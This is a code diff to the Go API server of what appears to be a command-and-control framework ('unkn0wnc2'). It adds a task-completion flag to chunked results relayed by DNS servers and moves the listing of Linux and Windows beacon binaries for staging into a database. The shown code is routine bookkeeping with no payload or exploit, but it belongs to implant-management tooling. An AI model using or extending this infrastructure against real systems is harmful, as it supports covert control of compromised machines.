@@ -1488,22 +1488,32 @@ func (api *APIServer) handleSubmitResult(w http.ResponseWriter, r *http.Request)
 		return
 	}
 
+	// Check if task is now complete after saving this chunk
+	taskComplete := false
+	task, err := api.db.GetTaskWithResult(req.TaskID)
+	if err == nil {
+		if status, ok := task["status"].(string); ok {
+			taskComplete = (status == "completed" || status == "failed")
+		}
+	}
+
 	if api.config.Debug {
 		if req.TotalChunks == 1 {
-			fmt.Printf("[API] Complete result from DNS server %s: Task %s (%d bytes)\n",
-				dnsServerID, req.TaskID, len(req.Data))
+			fmt.Printf("[API] Complete result from DNS server %s: Task %s (%d bytes) [task_complete=%v]\n",
+				dnsServerID, req.TaskID, len(req.Data), taskComplete)
 		} else {
 			// Check progress for multi-chunk results
 			received, total, _ := api.db.GetTaskResultProgress(req.TaskID)
-			fmt.Printf("[API] Result chunk from DNS server %s: Task %s, chunk %d/%d (progress: %d/%d)\n",
-				dnsServerID, req.TaskID, req.ChunkIndex, req.TotalChunks, received, total)
+			fmt.Printf("[API] Result chunk from DNS server %s: Task %s, chunk %d/%d (progress: %d/%d) [task_complete=%v]\n",
+				dnsServerID, req.TaskID, req.ChunkIndex, req.TotalChunks, received, total, taskComplete)
 		}
 	}
 
 	api.sendSuccess(w, "result recorded", map[string]interface{}{
-		"task_id":      req.TaskID,
-		"chunk_index":  req.ChunkIndex,
-		"total_chunks": req.TotalChunks,
+		"task_id":       req.TaskID,
+		"chunk_index":   req.ChunkIndex,
+		"total_chunks":  req.TotalChunks,
+		"task_complete": taskComplete,
 	})
 }
 
@@ -1639,72 +1649,17 @@ func (api *APIServer) handleStats(w http.ResponseWriter, r *http.Request) {
 
 // Stager Management Handlers
 
-// handleListClientBinaries returns all stored client binaries from the builds directory
+// handleListClientBinaries returns all stored client binaries from the database
 func (api *APIServer) handleListClientBinaries(w http.ResponseWriter, r *http.Request) {
-	// Derive builds directory from database path (/opt/unkn0wnc2/master.db -> /opt/unkn0wnc2/builds/client)
-	dbDir := filepath.Dir(api.config.DatabasePath)
-	buildsDir := filepath.Join(dbDir, "builds", "client")
-
-	fmt.Printf("[API] Listing client binaries from: %s\n", buildsDir)
-
-	// Find all beacon client files
-	files, err := filepath.Glob(filepath.Join(buildsDir, "beacon-*"))
+	// Query client binaries from database (where they're stored with chunks)
+	binaries, err := api.db.GetClientBinaries()
 	if err != nil {
-		fmt.Printf("[API] Error globbing files: %v\n", err)
-		api.sendError(w, http.StatusInternalServerError, "failed to search builds directory")
+		fmt.Printf("[API] Error querying client binaries from database: %v\n", err)
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve client binaries")
 		return
 	}
 
-	fmt.Printf("[API] Found %d files matching beacon-*\n", len(files))
-
-	// Build response with beacon info
-	var binaries []map[string]interface{}
-	for _, filePath := range files {
-		info, err := os.Stat(filePath)
-		if err != nil {
-			fmt.Printf("[API] Error stating file %s: %v\n", filePath, err)
-			continue
-		}
-
-		filename := filepath.Base(filePath)
-		fmt.Printf("[API] Processing file: %s\n", filename)
-
-		// Parse OS from filename (beacon-linux-* or beacon-windows-*)
-		var osType string
-		var arch string
-		if strings.HasPrefix(filename, "beacon-linux") {
-			osType = "linux"
-			arch = "x64"
-		} else if strings.HasPrefix(filename, "beacon-windows") {
-			osType = "windows"
-			arch = "x64"
-		} else {
-			fmt.Printf("[API] Skipping file (doesn't match pattern): %s\n", filename)
-			continue // Skip non-beacon files
-		}
-
-		// Calculate compressed size estimate (rough estimate: 40% of original)
-		compressedSize := int64(float64(info.Size()) * 0.4)
-
-		// Calculate chunk count (DNS-safe chunk size is 370 bytes)
-		base64Size := int64(float64(compressedSize) * 1.34) // base64 overhead
-		totalChunks := (base64Size + 369) / 370
-
-		binary := map[string]interface{}{
-			"id":              filename,
-			"filename":        filename,
-			"os":              osType,
-			"arch":            arch,
-			"original_size":   info.Size(),
-			"compressed_size": compressedSize,
-			"total_chunks":    totalChunks,
-			"created_at":      info.ModTime().Format(time.RFC3339),
-		}
-		binaries = append(binaries, binary)
-		fmt.Printf("[API] Added binary: %s (%s/%s)\n", filename, osType, arch)
-	}
-
-	fmt.Printf("[API] Returning %d client binaries\n", len(binaries))
+	fmt.Printf("[API] Returning %d client binaries from database\n", len(binaries))
 
 	if len(binaries) == 0 {
 		binaries = []map[string]interface{}{} // Return empty array instead of null
